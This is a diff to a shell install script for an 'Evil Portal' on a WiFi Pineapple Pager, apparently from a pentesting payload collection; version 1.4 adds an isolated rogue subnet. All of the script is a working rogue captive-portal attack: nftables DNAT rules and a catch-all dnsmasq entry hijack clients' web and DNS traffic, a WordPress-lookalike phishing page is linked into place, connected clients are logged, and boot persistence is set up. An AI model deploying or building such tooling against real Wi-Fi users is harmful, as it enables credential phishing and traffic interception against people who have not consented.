@@ -2,10 +2,59 @@
 # Name: Install Evil Portal on Pager
 # Description: Complete Evil Portal installation for WiFi Pineapple Pager (OpenWrt 24.10.1)
 # Author: PentestPlaybook
-# Version: 1.3
+# Version: 1.4
 # Category: Evil Portal
 
+# ====================================================================
+# STEP 0: Ask About Isolated Subnet Configuration
+# ====================================================================
+DIALOG_RESULT=$(CONFIRMATION_DIALOG "Configure isolated subnet? (recommended)")
+
+if [ "$DIALOG_RESULT" = "1" ]; then
+    # YES selected - use isolated network
+    PORTAL_IP="10.0.0.1"
+    BRIDGE_IF="br-evil"
+    
+    LOG "=============================================="
+    LOG "Configuring Isolated Evil Network..."
+    LOG "=============================================="
+    
+    # Add evil network configuration
+    LOG "Creating br-evil bridge and interface..."
+    echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
+    
+    # Add DHCP configuration for evil network
+    LOG "Configuring DHCP for evil network..."
+    echo -e "\nconfig dhcp 'evil'\n        option interface 'evil'\n        option start '100'\n        option limit '150'\n        option leasetime '1h'" >> /etc/config/dhcp
+    
+    # Assign wlan0wpa to evil network
+    LOG "Assigning wlan0wpa to evil network..."
+    sed -i "/config wifi-iface 'wlan0wpa'/,/option ifname/ s/\(option ifname 'wlan0wpa'\)/\1\n        option network 'evil'/" /etc/config/wireless
+    
+    # Remove wlan0wpa from br-lan bridge
+    LOG "Removing wlan0wpa from br-lan..."
+    sed -i "/list ports 'wlan0wpa'/d" /etc/config/network
+    
+    # Add evil network to LAN firewall zone for internet access
+    LOG "Adding evil network to firewall..."
+    uci add_list firewall.@zone[0].network='evil'
+    uci commit firewall
+    
+    LOG "SUCCESS: Isolated subnet configured"
+    LOG ""
+else
+    # NO selected - use main network
+    PORTAL_IP="172.16.52.1"
+    BRIDGE_IF="br-lan"
+    
+    LOG "Skipping isolated subnet configuration..."
+    LOG "Using main network: ${BRIDGE_IF} (${PORTAL_IP})"
+    LOG ""
+fi
+
 LOG "Starting Evil Portal installation for WiFi Pineapple Pager..."
+LOG "Portal IP: ${PORTAL_IP}"
+LOG "Bridge Interface: ${BRIDGE_IF}"
 
 # ====================================================================
 # STEP 1: Install Required Packages
@@ -407,7 +456,7 @@ LOG "SUCCESS: Permissions configured"
 # STEP 6: Create Init Script and Whitelist Daemon
 # ====================================================================
 LOG "Step 6: Creating Evil Portal init script..."
-cat > /etc/init.d/evilportal << 'INITEOF'
+cat > /etc/init.d/evilportal << INITEOF
 #!/bin/sh /etc/rc.common
 
 START=99
@@ -417,35 +466,45 @@ START=99
 add_nft_rules() {
     # Add TEMPORARY nftables rules to the main dstnat chain with interface match
     # These disappear on reboot since they're not in UCI config
-    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 443 counter dnat ip to 172.16.52.1:80
-    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 80 counter dnat ip to 172.16.52.1:80
-    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 tcp dport 53 counter dnat ip to 172.16.52.1:5353
-    nft insert rule inet fw4 dstnat iifname "br-lan" meta nfproto ipv4 udp dport 53 counter dnat ip to 172.16.52.1:5353
+    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 443 counter dnat ip to ${PORTAL_IP}:80
+    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 80 counter dnat ip to ${PORTAL_IP}:80
+    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 tcp dport 53 counter dnat ip to ${PORTAL_IP}:5353
+    nft insert rule inet fw4 dstnat iifname "${BRIDGE_IF}" meta nfproto ipv4 udp dport 53 counter dnat ip to ${PORTAL_IP}:5353
 }
 
 # Helper function to remove nft rules from memory
 remove_nft_rules() {
     # Remove temporary rules from dstnat chain (the ones we added with iifname match)
-    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "dnat ip to 172.16.52.1" | awk '{print $NF}' | while read handle; do
-        nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
+    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat handle "\$handle" 2>/dev/null
+    done
+
+    # Also remove from dstnat_lan if it exists (for UCI-created rules)
+    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat_lan handle "\$handle" 2>/dev/null
     done
     
-    # Also remove from dstnat_lan if it exists (for UCI-created rules)
-    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "dnat ip to 172.16.52.1" | awk '{print $NF}' | while read handle; do
-        nft delete rule inet fw4 dstnat_lan handle "$handle" 2>/dev/null
+    # Also remove from dstnat_evil if it exists
+    nft -a list chain inet fw4 dstnat_evil 2>/dev/null | grep "dnat ip to ${PORTAL_IP}" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat_evil handle "\$handle" 2>/dev/null
     done
 }
 
 # Helper function to remove whitelist rules
 remove_whitelist_rules() {
     # Remove from dstnat chain
-    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "ip saddr.*accept" | awk '{print $NF}' | while read handle; do
-        nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
+    nft -a list chain inet fw4 dstnat 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat handle "\$handle" 2>/dev/null
+    done
+
+    # Also remove from dstnat_lan if it exists
+    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat_lan handle "\$handle" 2>/dev/null
     done
     
-    # Also remove from dstnat_lan if it exists
-    nft -a list chain inet fw4 dstnat_lan 2>/dev/null | grep "ip saddr.*accept" | awk '{print $NF}' | while read handle; do
-        nft delete rule inet fw4 dstnat_lan handle "$handle" 2>/dev/null
+    # Also remove from dstnat_evil if it exists
+    nft -a list chain inet fw4 dstnat_evil 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
+        nft delete rule inet fw4 dstnat_evil handle "\$handle" 2>/dev/null
     done
 }
 
@@ -457,15 +516,15 @@ start_services() {
     chmod 666 /tmp/EVILPORTAL_CLIENTS.txt
     /etc/init.d/php8-fpm start
     /etc/init.d/nginx start
-    kill $(netstat -plant 2>/dev/null | grep ':5353' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
-    dnsmasq --no-hosts --no-resolv --address=/#/172.16.52.1 -p 5353 &
+    kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
+    dnsmasq --no-hosts --no-resolv --address=/#/${PORTAL_IP} -p 5353 &
     rm -f /www/captiveportal
     ln -s /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
     ln -sf /root/portals/Wordpress/index.php /www/index.php
     ln -sf /root/portals/Wordpress/MyPortal.php /www/MyPortal.php
     ln -sf /root/portals/Wordpress/helper.php /www/helper.php
     ln -sf /root/portals/Wordpress/index.php /www/generate_204
-    
+
     # Start whitelist daemon
     /usr/bin/evilportal-whitelist-daemon &
 }
@@ -474,10 +533,10 @@ start_services() {
 stop_services() {
     /etc/init.d/php8-fpm stop
     /etc/init.d/nginx stop
-    kill $(netstat -plant 2>/dev/null | grep ':5353' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
+    kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
     killall evilportal-whitelist-daemon 2>/dev/null
     rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204
-    
+
     # Remove whitelist rules
     remove_whitelist_rules
 }
@@ -485,20 +544,20 @@ stop_services() {
 start() {
     # Add TEMPORARY nft rules (disappear on reboot)
     add_nft_rules
-    
+
     # Start services
     start_services
-    
+
     logger -t evilportal "Evil Portal started (temporary - will not persist after reboot)"
 }
 
 stop() {
     # Stop services
     stop_services
-    
+
     # Remove nft rules from memory
     remove_nft_rules
-    
+
     logger -t evilportal "Evil Portal stopped"
 }
 
@@ -510,12 +569,13 @@ restart() {
 
 enable() {
     # Add PERSISTENT firewall NAT rules via UCI
+    # Using 'lan' as the source zone (which includes 'evil' network)
     uci add firewall redirect
     uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='443'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
     uci set firewall.@redirect[-1].dest_port='80'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -524,7 +584,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='80'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
     uci set firewall.@redirect[-1].dest_port='80'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -533,7 +593,7 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='tcp'
     uci set firewall.@redirect[-1].src_dport='53'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
     uci set firewall.@redirect[-1].dest_port='5353'
     uci set firewall.@redirect[-1].target='DNAT'
 
@@ -542,46 +602,46 @@ enable() {
     uci set firewall.@redirect[-1].src='lan'
     uci set firewall.@redirect[-1].proto='udp'
     uci set firewall.@redirect[-1].src_dport='53'
-    uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+    uci set firewall.@redirect[-1].dest_ip='${PORTAL_IP}'
     uci set firewall.@redirect[-1].dest_port='5353'
     uci set firewall.@redirect[-1].target='DNAT'
 
     uci commit firewall
     /etc/init.d/firewall restart
-    
+
     # Create boot symlink
     ln -sf /etc/init.d/evilportal /etc/rc.d/S99evilportal
-    
+
     # Start services
     start_services
-    
+
     logger -t evilportal "Evil Portal enabled and started (persistent - will survive reboot)"
 }
 
 disable() {
     # Stop services first
     stop_services
-    
+
     # Remove nft rules from memory
     remove_nft_rules
-    
+
     # Remove boot symlink
     rm -f /etc/rc.d/*evilportal
-    
+
     # Remove PERSISTENT firewall NAT rules from UCI - delete from highest index to lowest
     while uci show firewall | grep -q "Evil Portal"; do
         # Get the last (highest index) redirect rule containing "Evil Portal"
-        LAST_INDEX=$(uci show firewall | grep "redirect\[" | grep "Evil Portal" | tail -n1 | sed 's/.*redirect\[\([0-9]*\)\].*/\1/')
-        if [ -n "$LAST_INDEX" ]; then
-            uci delete firewall.@redirect[$LAST_INDEX]
+        LAST_INDEX=\$(uci show firewall | grep "redirect\[" | grep "Evil Portal" | tail -n1 | sed 's/.*redirect\[\([0-9]*\)\].*/\1/')
+        if [ -n "\$LAST_INDEX" ]; then
+            uci delete firewall.@redirect[\$LAST_INDEX]
         else
             break
         fi
     done
-    
+
     uci commit firewall
     /etc/init.d/firewall restart
-    
+
     logger -t evilportal "Evil Portal disabled and cleaned up (removed from boot)"
 }
 INITEOF
@@ -630,7 +690,7 @@ uci set firewall.@redirect[-1].name='Evil Portal HTTPS'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='443'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
 uci set firewall.@redirect[-1].dest_port='80'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -639,7 +699,7 @@ uci set firewall.@redirect[-1].name='Evil Portal HTTP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='80'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
 uci set firewall.@redirect[-1].dest_port='80'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -648,7 +708,7 @@ uci set firewall.@redirect[-1].name='Evil Portal DNS TCP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='tcp'
 uci set firewall.@redirect[-1].src_dport='53'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
 uci set firewall.@redirect[-1].dest_port='5353'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -657,7 +717,7 @@ uci set firewall.@redirect[-1].name='Evil Portal DNS UDP'
 uci set firewall.@redirect[-1].src='lan'
 uci set firewall.@redirect[-1].proto='udp'
 uci set firewall.@redirect[-1].src_dport='53'
-uci set firewall.@redirect[-1].dest_ip='172.16.52.1'
+uci set firewall.@redirect[-1].dest_ip="${PORTAL_IP}"
 uci set firewall.@redirect[-1].dest_port='5353'
 uci set firewall.@redirect[-1].target='DNAT'
 
@@ -724,7 +784,7 @@ LOG "Step 10: Running verification tests..."
 
 # Test portal HTTP response
 LOG "Testing portal HTTP response..."
-if curl -s http://172.16.52.1/ | grep -q "Evil Portal"; then
+if curl -s http://${PORTAL_IP}/ | grep -q "Evil Portal"; then
     LOG "SUCCESS: Portal HTTP responding"
 else
     LOG "WARNING: Portal HTTP not responding correctly"
@@ -732,7 +792,7 @@ fi
 
 # Verify NAT rules exist
 LOG "Verifying NAT rules..."
-if nft list chain inet fw4 dstnat 2>/dev/null | grep -q "172.16.52.1"; then
+if nft list chain inet fw4 dstnat 2>/dev/null | grep -q "${PORTAL_IP}"; then
     LOG "SUCCESS: NAT rules configured"
 else
     LOG "ERROR: NAT rules not found"
@@ -753,7 +813,8 @@ fi
 LOG "=================================================="
 LOG "Evil Portal Installation Complete!"
 LOG "=================================================="
-LOG "Portal URL: http://172.16.52.1/"
+LOG "Portal URL: http://${PORTAL_IP}/"
+LOG "Bridge Interface: ${BRIDGE_IF}"
 LOG "Services Status:"
 LOG "  - PHP-FPM: $(pgrep php8-fpm > /dev/null && echo 'Running' || echo 'Stopped')"
 LOG "  - nginx: $(pgrep nginx > /dev/null && echo 'Running' || echo 'Stopped')"
@@ -768,14 +829,14 @@ LOG "Management commands:"
 LOG "  Enable:  /etc/init.d/evilportal enable   (turn ON + persist after reboot)"
 LOG "  Disable: /etc/init.d/evilportal disable  (turn OFF + remove from boot)"
 LOG "  Start:   /etc/init.d/evilportal start    (turn ON temporarily - gone after reboot)"
-LOG "  Stop:    /etc/init.d/evilportal stop     (turn OFF temporarily)"
+LOG "  Stop:    /etc/init.d/evilportal stop     (turn OFF temporarily  - gone after reboot)"
 LOG "  Restart: /etc/init.d/evilportal restart  (restart portal)"
 LOG ""
 LOG "Behavior:"
 LOG "  - enable + reboot  = Portal ON (persistent)"
-LOG "  - disable + reboot = Portal OFF"
-LOG "  - start + reboot   = Portal OFF (temporary, not persistent)"
-LOG "  - stop + reboot    = depends on enable/disable state"
+LOG "  - disable + reboot = Portal OFF (persistent)"
+LOG "  - start + reboot   = Portal ON (temporary, not persistent)"
+LOG "  - stop + reboot    = Portal OFF (temporary, not persistent)"
 LOG "=================================================="
 
 exit 0
